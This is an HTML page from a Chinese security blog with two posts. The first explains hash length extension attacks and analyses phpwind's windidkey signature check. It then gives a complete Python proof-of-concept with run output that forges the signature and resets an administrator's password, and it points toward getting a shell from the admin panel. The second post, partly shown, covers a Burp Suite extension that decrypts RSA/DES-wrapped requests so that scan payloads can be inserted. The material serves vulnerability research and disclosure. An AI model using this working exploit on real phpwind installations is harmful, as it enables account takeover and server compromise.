+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#1 哈希长度扩展攻击</p>
+<p>##1.1 简介<br>哈希长度扩张攻击（hash length attack）是一类针对某些哈希函数可以额外添加一些信息的攻击手段，适用于已经确定哈希值和密钥长度的情况。哈希值基本表示如下H（密钥||消息），即知道了哈希值和密钥的长度，可以推出H（密钥||消息||padding||append）的哈希值，padding是要填充的字段，append则是要附加的消息。其实如果不知道密钥长度，可通过暴力猜解得到，已知的有长度扩展攻击缺陷的函数有MD5，SHA-1，SHA-256等等,详细的攻击原理可参考<a href="Everything%20you%20need%20to%20know%20about%20hash%20length%20extension%20attacks">Everything you need to know about hash length extension attacks</a></p>
+<p>##1.2 利用<br>这里推荐有python扩展的HashPump，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。<br>安装：<code>pip install hashpumpy</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# hashpump --help</div><div class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</div><div class="line">     HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</div><div class="line">     -h --help          Display this message.</div><div class="line">     -t --test          Run tests to verify each algorithm is operating properly.</div><div class="line">     -s --signature     The signature from known message.</div><div class="line">     -d --data          The data from the known message.</div><div class="line">     -a --additional    The information you would like to add to the known message.</div><div class="line">     -k --keylength     The length in bytes of the key being used to sign the original message with.</div><div class="line">     Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</div><div class="line">     &lt;Developed by bwall(@botnet_hunter)&gt;</div></pre></td></tr></table></figure></p>
+<p>-s参数对应的就是H(密钥||消息)中的哈希值，-d参数对应着消息，-k参数对应着密钥的长度，-a则是要附加的消息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# hashpump -s &quot;ebfe0fff1806cfe6186c6a0b172e8148&quot; -d &quot;1465895192adoAvatarcavatarmapitypeflashuid2uidundefined&quot; -k 32 -a namespacesiteaeditUsercusermapipasswordGongFang9uid1</div><div class="line">4daee9a61955a1c17319f4c1664d11df</div><div class="line">1465895192adoAvatarcavatarmapitypeflashuid2uidundefined\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x00\x00\x00namespacesiteaeditUsercusermapipasswordGongFang9uid1</div></pre></td></tr></table></figure></p>
+<p>最后提供一个哈希扩展攻击在线工具：<a href="http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2" target="_blank" rel="external">http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2</a>]</p>
+<p>#2 phpwind利用点分析<br>phpwind会在每次请求的时候校验密钥，具体的对应函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">public  function beforeAction($handlerAdapter) &#123;</div><div class="line">	parent::beforeAction($handlerAdapter);</div><div class="line">	$charset = &apos;utf-8&apos;;</div><div class="line">	$_windidkey = $this-&gt;getInput(&apos;windidkey&apos;, &apos;get&apos;);</div><div class="line">	$_time = (int)$this-&gt;getInput(&apos;time&apos;, &apos;get&apos;);</div><div class="line">	$_clientid = (int)$this-&gt;getInput(&apos;clientid&apos;, &apos;get&apos;);</div><div class="line">	if (!$_time || !$_clientid) $this-&gt;output(WindidError::FAIL);</div><div class="line">	$clent = $this-&gt;_getAppDs()-&gt;getApp($_clientid);</div><div class="line">	if (!$clent) $this-&gt;output(WindidError::FAIL);</div><div class="line">	if (WindidUtility::appKey($clent[&apos;id&apos;], $_time, $clent[&apos;secretkey&apos;], $this-&gt;getRequest()-&gt;getGet(null), $this-&gt;getRequest()-&gt;getPost()) != $_windidkey)  $this-&gt;output(WindidError::FAIL);</div><div class="line">	</div><div class="line">	$time = Pw::getTime();</div><div class="line">	if ($time - $_time &gt; 1200) $this-&gt;output(WindidError::TIMEOUT);</div><div class="line">	$this-&gt;appid = $_clientid;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在这个函数中会提取windidkey，并且和<code>WindidUtility::appKey</code>生成的结果做对比，不同则退出，如过相同继续判断时间是否超时，超时也退出，appKey的实现如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">public static function appKey($apiId, $time, $secretkey, $get, $post) &#123;</div><div class="line">	// 注意这里需要加上__data，因为下面的buildRequest()里加了。</div><div class="line">	$array = array(&apos;windidkey&apos;, &apos;clientid&apos;, &apos;time&apos;, &apos;_json&apos;, &apos;jcallback&apos;, &apos;csrf_token&apos;,</div><div class="line">				   &apos;Filename&apos;, &apos;Upload&apos;, &apos;token&apos;, &apos;__data&apos;);</div><div class="line">	$str = &apos;&apos;;</div><div class="line">	ksort($get);</div><div class="line">	ksort($post);</div><div class="line">	foreach ($get AS $k=&gt;$v) &#123;</div><div class="line">		if (in_array($k, $array)) continue;</div><div class="line">		$str .=$k.$v;</div><div class="line">	&#125;</div><div class="line">	foreach ($post AS $k=&gt;$v) &#123;</div><div class="line">		if (in_array($k, $array)) continue;</div><div class="line">		$str .=$k.$v;</div><div class="line">	&#125;</div><div class="line">	return md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在函数中<code>md5(md5($apiId.&#39;||&#39;.$secretkey).$time.$str)</code>的值是知道的，即<a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html" target="_blank" rel="external">windidkey，这个值在用户上传头像处泄露</a>，<code>md5($apiId.&#39;||&#39;.$secretkey)</code>的长度是知道的，32bit，<code>$time.$str</code>参数是用户可控的，那么就满足了哈希扩展长度攻击，下面我们看下用户上传头像处的请求，右键查看源代码找到如下请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.3.106/windid/index.php?m=api&amp;c=avatar&amp;a=doAvatar&amp;uid=2&amp;windidkey=b6f98f9e78105ca0ec4239de8478cd26&amp;time=1465977216&amp;clientid=1&amp;type=flash&amp;avatar=http://192.168.3.106/windid/attachment//avatar/000/00/00/2.jpg?r=18504</div></pre></td></tr></table></figure></p>
+<p>接着看实际构造的appKey的参数效果,这个可以根据trace的结果直接给出，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md5(&apos;520a1e355b8cfc82e56ae578176d7f101465977216adoAvatarcavatarmapitypeflashuid2uidundefined&apos;) /var/www/html/src/windid/service/base/WindidUtility.php:54</div></pre></td></tr></table></figure></p>
+<p><code>md5($apiId.&#39;||&#39;.$secretkey)</code>的值为<code>520a1e355b8cfc82e56ae578176d7f10</code>，<code>$time</code>为<code>1465977216</code>,<code>$str</code>为<code>adoAvatarcavatarmapitypeflashuid2uidundefined</code>,从appKey函数的实现来看，$str就是get，post请求进行取舍排序得到的。有了这个基础，根据hashpump公式，在post请求中加入我们的参数，并计算出合适的windidkey值，提交请求，就可达到目的。</p>
+<p>#3 利用POC<br>可利用如下的代码构造post请求，修改某uid用户的密码。如果修改的是管理员的密码，并且这管理员有相应的后台权限，那么我们就可以在后台getshell，利用脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">#!env python</div><div class="line"># coding=utf-8</div><div class="line">import hashpumpy</div><div class="line">import urllib</div><div class="line">import urlparse</div><div class="line">import urllib2</div><div class="line">import requests</div><div class="line"></div><div class="line">def md5hack(md5, ori_str, append, security_len):</div><div class="line">    md5, message = hashpumpy.hashpump(md5, ori_str,append, security_len)</div><div class="line">    quoted_message = urllib.quote(message)</div><div class="line">    print &apos;md5 after hash length attacked:&apos;,md5</div><div class="line">    print &apos;message:&apos;,message</div><div class="line">    print &apos;quote message:&apos;,quoted_message</div><div class="line">    return (md5,quoted_message)</div><div class="line"></div><div class="line"></div><div class="line">def modify_passwd(ip, uid, target_uid, windidkey, padding, time, password=&quot;GongFang9&quot;):</div><div class="line">    &quot;&quot;&quot;修改后台管理员的密码&quot;&quot;&quot;</div><div class="line">    target_uid = target_uid #uid是后台管理的uid参数</div><div class="line">    host = &quot;http://&quot; + ip</div><div class="line">    data = &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid, password)</div><div class="line">    url = &quot;&#123;0&#125;/windid/index.php?windidkey=&#123;1&#125;&amp;adoAvatarcavatarmapitypeflashuid&#123;2&#125;uidundefined=&#123;3&#125;&amp;clientid=1&amp;time=&#123;4&#125;&amp;namespace=site&quot;.format(host,windidkey,uid,padding,time)</div><div class="line">    print &apos;url:&apos;,url</div><div class="line">    print &apos;data:&apos;,data</div><div class="line">    r = requests.post(url,data=data)</div><div class="line">    #r = requests.post(url,data=data,headers=headers)</div><div class="line">    print r.text</div><div class="line">    if r.text.strip() == &quot;1&quot;:</div><div class="line">        print &apos;modify password Succeed&apos;</div><div class="line">    else:</div><div class="line">        print &apos;failed&apos;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    &quot;&quot;&quot;点开用户头像上传处,右键查看源码,搜索windidkey,拷贝含flash字段的那个request作为r参数&quot;&quot;&quot;</div><div class="line">    r = &quot;&quot;&quot;http%3A%2F%2F192.168.3.106%2Fwindid%2Findex.php%3Fm%3Dapi%26c%3Davatar%26a%3DdoAvatar%26uid%3D5%26windidkey%3D1eb5af71d002ac89e22c0170806b0fe8%26time%3D1466416702%26clientid%3D1%26type%3Dflash&amp;avatar=http%3A%2F%2F192.168.3.106%2Fwindid%2Fattachment%2F%2Favatar%2F000%2F00%2F00%2F5.jpg%3Fr%3D78057&quot;&quot;&quot;</div><div class="line"></div><div class="line">    request = urlparse.urlparse(urllib.unquote(r))</div><div class="line">    querys = [item for item in request.query.split(&quot;&amp;&quot;)]</div><div class="line">    query_dict = &#123;item.split(&quot;=&quot;)[0]:item.split(&quot;=&quot;)[1] for item in querys&#125;</div><div class="line"></div><div class="line">    ori_md5 = query_dict.get(&quot;windidkey&quot;)</div><div class="line">    time = query_dict.get(&apos;time&apos;)</div><div class="line">    uid = query_dict.get(&apos;uid&apos;)</div><div class="line"></div><div class="line">    ori_str = &quot;&#123;0&#125;adoAvatarcavatarmapitypeflashuid&#123;1&#125;uidundefined&quot;.format(time,uid)</div><div class="line">    password = &quot;test123&quot;</div><div class="line">    ip = &quot;192.168.3.173&quot;</div><div class="line">    ip = &quot;192.168.3.106&quot;</div><div class="line">    target_uid = 3</div><div class="line"></div><div class="line">    post_append= &quot;a=getConfig&amp;c=config&amp;m=api&amp;id=1&quot;</div><div class="line">    post_append= &quot;a=editUser&amp;c=user&amp;m=api&amp;uid=&#123;0&#125;&amp;password=&#123;1&#125;&quot;.format(target_uid,password)</div><div class="line">    post = &quot;&quot;.join(sorted([item.replace(&quot;=&quot;,&quot;&quot;) for item in post_append.split(&quot;&amp;&quot;)]))</div><div class="line"></div><div class="line">#    security = &quot;d2edc0a3340df65cb66387464f3adfc1&quot;</div><div class="line">#    ori_str = &quot;1465784719adoAvatarcavatarmapitypeflashuid2uidundefined&quot;</div><div class="line">    security_len = 32#phpwind计算windidkey 公式md5(md5($apiId.&apos;||&apos;.$secretkey).$time.$str),md5值的长度是32</div><div class="line">    print &apos;hashmd5:&apos;,ori_md5</div><div class="line">    print &apos;security len:&apos;, security_len</div><div class="line">    print &apos;ori_str&apos;, ori_str</div><div class="line">    append = &apos;agetcappid1mapi&apos;</div><div class="line">    append = &quot;namespacesite&quot; + post</div><div class="line">    print &apos;post&apos;,append</div><div class="line">    (md5,quoted_message) = md5hack(ori_md5, ori_str, append, security_len)</div><div class="line">    padding = quoted_message[quoted_message.index(&quot;%&quot;):quoted_message.rindex(&quot;%&quot;)+3]</div><div class="line"></div><div class="line">    modify_passwd(ip, uid, target_uid, md5, padding, time, password)</div></pre></td></tr></table></figure></p>
+<p>运行之后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# python md5hack.py</div><div class="line">hashmd5: 4d8971d0d2556d5dcbeb3b0f10e41429</div><div class="line">security len: 32</div><div class="line">ori_str 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined</div><div class="line">post namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">md5 after hash length attacked: e46e0aaddbd4e008077535a4dafab3f5</div><div class="line">message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined▒▒namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">quote message: 1466474956adoAvatarcavatarmapitypeflashuid10uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00namespacesiteaeditUsercusermapipasswordtangTest3uid3</div><div class="line">url: http://192.168.3.173/windid/index.php?windidkey=e46e0aaddbd4e008077535a4dafab3f5&amp;adoAvatarcavatarmapitypeflashuid10uidundefined=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%02%00%00%00%00%00%00&amp;clientid=1&amp;time=1466474956&amp;namespace=site</div><div class="line">data: a=editUser&amp;c=user&amp;m=api&amp;uid=3&amp;password=test123</div><div class="line">1</div><div class="line">modify password Succeed</div></pre></td></tr></table></figure></p>
+<p>代码中修改uid为3的账户的密码为GongFang7，假设该用户具有后台管理员权限，进入后台getshell，具体的getshell可参考<a href="http://www.wooyun.org/bugs/wooyun-2016-0175518" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0175518</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/Burpsuite插件开发之RSA加解密/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/Burpsuite插件开发之RSA加解密/" itemprop="url">
+                  Burpsuite 插件开发之RSA加解密
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Burp/" itemprop="url" rel="index">
+                    <span itemprop="name">Burp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/Burpsuite插件开发之RSA加解密/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/Burpsuite插件开发之RSA加解密/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/Burpsuite插件开发之RSA加解密/" class="leancloud_visitors" data-flag-title="Burpsuite 插件开发之RSA加解密">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>burpsuit extention 插件 RSA encryption decryption</p>
+<hr>
+<p>#1，简介</p>
+<p> burpsuit是一款非常好用的工具，目前我自己也是重度用户，所以就上手了burpsuit的插件接口开发，这篇文档主要记录了一个解密请求包，插入payload，再加密的插件开发过程。详细的代码见<a href="https://github.com/shengqi158/RSA-Crypto-Burp-Extention" target="_blank" rel="external">github代码</a>，代码中除了burpsuit的接口实现，还包括各种加解密处理代码。在文档中数据首先是以rsa方式加密des的key得到encryptKey，然后使用des的key加密数据包得到data，再组装成一个JSON格式串，这是加密过程，当然解密过程就是逆向的。插件应用场景主要是用于通过分析apk的实现，或者泄露的密钥，获取其加解密算法，在解密后的数据包中插入payload，发现注入问题等。如下则是加密后的数据包：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c=&#123;</div><div class="line">&quot;data&quot;:&quot;21BhviedgtbwK6rdlK7vzltqxOLxUmU2g5qaO5LWPYTha5fXslmL6jrMkFnJBwpZPZMNl5foxTUHw2Mae++zkWwtzWkKXI9WJ/CJqxO9uORT5I6iUmIG7bBcgnHpmlSNKfFwBvnr9vj3v5ByvW2s2/pL9rSaeD+/8XsX01NA96mC4g5pVBeU5IY9F4tdxH9yobXfN6GzEVhLeiEd30xzMA\u003d\u003d&quot;,</div><div class="line">&quot;encryptKey&quot;:&quot;bjWZgigAW/ZaAA55v7Yi9AGt2qsP7BfZZISu70qc/xVUVfh5L/Mw/mMbzxkcZ6uXb1vvgXvF7hHYwjsVzvEkRK0rIfIwkcYzn160fvQ/8+F8YBMDLzTEhf8r0KjOLlJV+HgOsS4QG/G9lOU5mnupfrVA9sf54b3OvXHU0TQVG7U\u003d&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p> 从数据库包能看到大的数据是一个json格式，里面有data，和encryptKey值，encryptKey就是使用RSA加密des 的key得到的，RSA的工作方式和pem文件可通过界面设置，再接着用这个key采用des方式解密data中的内容。操作界面如下：<br><img src="burp_rsa.png" alt="操作界面图"></p>
+<p>#2，InsertPoint 接口</p>
+<p>InsertPoint顾名思义就是注入点，就是payload插入的地方，比如request中的cookie，参数等位置。为了对一些burpsuit不支持的参数格式进行支持就必须实现该接口，可以用在Active Scanner和Intruder中.</p>
+<p>##2.1 基础开发知识</p>
+<p>最好的方式就是在原有插件的基础上修改，这样能省很多精力，当然如果要一步一步来的话，步骤如下：<br>（1）包含burp的接口文件<br>（2）创建一个包名为burp，在里面创建BurpExtender类，实现IBurpExtender接口，这个BurpExtender类是所有接口的心脏，注意这里涉及到名字都不能改动，burp插件就这么规定的。<br>（3）实现唯一的接口函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) &#123;</div><div class="line">        this. callbacks = callbacks ;</div><div class="line">       &#125;</div></pre></td></tr></table></figure></p>
+<p>通过callbacks获取核心基础库能力,像日志，请求，返回值修改等。<br>（4）日志接口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);</div><div class="line">PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);</div><div class="line">//输出到插件的output</div><div class="line">stdout.println(&quot;Hello output&quot;);</div><div class="line">// 输出到alerts tab</div><div class="line">callbacks.issueAlert(&quot;Hello alerts&quot;);</div><div class="line">//打印调用栈</div><div class="line">e.printStackTrace(stderr)</div><div class="line">```    </div><div class="line">有了这些日志接口就能比较好的调试代码了，如果要很好的跟踪请求的，可以在BApp Store中添加&quot;Custom Logger&quot;这个插件，能够记录所有的请求和返回信息。</div><div class="line"></div><div class="line">##2.2 getInsertionPoints</div><div class="line"></div><div class="line">下面我们就来讲讲如何实现一个`InsertionPoints`接口。</div><div class="line">第一步继承`IScannerInsertionPointProvider`接口，实现getInsertionPoints()方法，同时通过`callbacks.registerScannerInsertionPointProvider(this)`方法注册成为insertion point provider。下面我们就来看看`getInsertionPoints()`的实现。</div></pre></td></tr></table></figure>
+<pre><code> @Override
+public List&lt;IScannerInsertionPoint&gt; getInsertionPoints(IHttpRequestResponse baseRequestResponse)
+{
+    // 生成insertPoints数组
+    List&lt;IScannerInsertionPoint&gt; insertionPoints = new ArrayList&lt;IScannerInsertionPoint&gt;();
+    // 获取请求参数
+    IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse.getRequest());
+    List&lt;IParameter&gt; requestParams = requestInfo.getParameters();
+
+
+    for (IParameter parameter : requestParams) {
+        String value = parameter.getValue();
+        value = helpers.urlDecode(value).trim();
+        EncryptBean encryptBean = new EncryptBean();
+        if (parameter.getName().trim().equals(&quot;c&quot;)){//参数中含有c参数表示要加密的内容
+            encryptBean = JSON.parseObject(value, EncryptBean.class);
+            stdout.println(&quot;private key: &quot; + key.privateKey + &quot; public key &quot; + key.publicKey);
+            try {
+                value = decryptRSAAndDES(key, encryptBean);
+                stdout.println(&quot;after decrypted:Will scan  data at parameter &quot; + parameter + &quot; with value decrypted &quot; + value);
+
+            } catch (Exception e) {
+                e.printStackTrace(stderr);
+            }
+
+            if (value.isEmpty()) continue;
+
+            try {
+                String basename = parameter.getName();
+                //insertionPoints.add(new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value));
+                JSONObject jsonObj = JSON.parseObject(value);
+                String basevalue = &quot;&quot;;
+                for(Map.Entry&lt;String, Object&gt; entry: jsonObj.entrySet()){
+                    basename = entry.getKey();
+                    basevalue = entry.getValue().toString();
+                    //在这里传入总的value值以便在InsertionPoint进行分解，构造加密后的request请求，构造InsertionPoint时传入的value为总的value值
+                    insertionPoints.add(0,new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value));
+                    stdout.println(&quot;in for:Will scan AES encrypted data at parameter &quot; + basename + &quot; with value &quot; + value);
+                }
+
+            } catch(Exception e) {
+            }
+
+        }
+
+    }
+
+    return insertionPoints;
+}
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">这一段代码的大体意思就是通过helper.analyzeRequest方法获取所有请求信息，遍历其中的参数信息，当发现参数名等于&quot;c&quot;时就会调用解密过程，这块的代码需要根据参数格式自定义解析参数过程。调用解密的过程大体就是先解析JSON格式，然后解密，得到解密数据的内容后调用`new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)`实例化一个注入点。一般情况下basename和value是一一对应的，如param1=phoneNum，但是这里我们basename传入param1，value值则是解密后的值如`&#123;&quot;userid&quot;:&quot;51ba27cb-514d-3d86-0000-2f7515a40613&quot;,&quot;task_id&quot;:&quot;1450147269&quot;,&quot;param1&quot;:&quot;000000000000000&quot;,&quot;m&quot;:&quot;https&quot;&#125;`，这么传递是为了方便实例化插入点。接着我们看下InsertionPoint的参数构造。</div><div class="line"></div><div class="line">##2.3 InsertionPoint</div></pre></td></tr></table></figure>
+<p>InsertionPoint(BurpExtender newParent, byte[] baseRequest, String basename, String basevalue)<br>    {<br>        this.parent = newParent;<br>        this.baseRequest = baseRequest;<br>        this.baseName = basename;<br>        //this.baseValue = basevalue;<br>        this.value = basevalue;<br>        this.baseValue = JSON.parseObject(basevalue).getString(basename);</p>
+<pre><code>}
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在InsertionPoint的代码中有一个很重要的接口就是buildRequest，这个函数就是用来添加payload。</div></pre></td></tr></table></figure>
+<p>  @Override<br>    public byte[] buildRequest(byte[] payload)<br>    {<br>        String payloadPlain = parent.helpers.bytesToString(payload);<br>        String payloadEncrypted = “”;<br>        String tmpAESKey = “0123456789abcdef”;<br>        parent.stdout.println(“payloadPlain:” + payloadPlain);<br>        parent.callbacks.issueAlert(“payloadPlain:” + payloadPlain);<br>        try {<br>            Map<string,string> map = JSON.parseObject(this.value, new TypeReference<map<string, string="">&gt;(){}.getType());<br>            map.put(this.baseName, getBaseValue() + payloadPlain );<br>            String allPayloadPlain = JSON.toJSONString(map);<br>            payloadEncrypted = parent.encryptRSAAndDES(allPayloadPlain, tmpAESKey, parent.key);<br>        } catch(Exception e) {<br>            parent.callbacks.issueAlert(e.toString());<br>        }<br>        parent.stdout.println(“Inserting “ + payloadPlain + “ [“ + payloadEncrypted + “] in parameter “ + baseName);<br>        // TODO: Only URL parameters, must change to support POST parameters, cookies, etc.<br>        //“c” 解密数据格式包一致<br>        return parent.helpers.updateParameter(baseRequest, parent.helpers.buildParameter(“c”, payloadEncrypted, IParameter.PARAM_BODY));<br>    }<br><code>``
+这段代码就是获取payload，然后嵌入到解密后的请求包，然后将请求加密，最后调用updateParameter更新参数信息。在这里要注意</code>parent.helpers.buildParameter(“c”, payloadEncrypted, IParameter.PARAM_BODY)<code>c是body中的请求参数，和我们的数据格式对应，</code>IParameter.PARAM_BODY<code>这个参数则表明是Body中的请求参数，如果是URl中的则是</code>PARAM_URL`</map<string,></string,string></p>
+<p>##2.4 接口关系</p>
+<p>知道了上述接口的作用，感觉还糊里糊涂的。那就是这些接口是怎么串起来的，数据包是如何流动的，下面我们来看下active scanning的流程。<br><img src="burp-active-scan.png" alt="active scan流程"><br>ActiveScanner引擎从InsertionPoints Provider获取Insertion Points，然后调用BuildRequest发送Request，Requst再经过HttpListener的处理到达webServer。</p>
+<p>参考文献：</p>
+<p><a href="http://drops.wooyun.org/papers/3962" target="_blank" rel="external">http://drops.wooyun.org/papers/3962</a></p>
+<p><a href="http://2015.zeronights.ru/assets/files/42-Elkin-Bulatenko.pdf" target="_blank" rel="external">http://2015.zeronights.ru/assets/files/42-Elkin-Bulatenko.pdf</a></p>
+<p><a href="https://github.com/lgrangeia/aesburp" target="_blank" rel="external">https://github.com/lgrangeia/aesburp</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
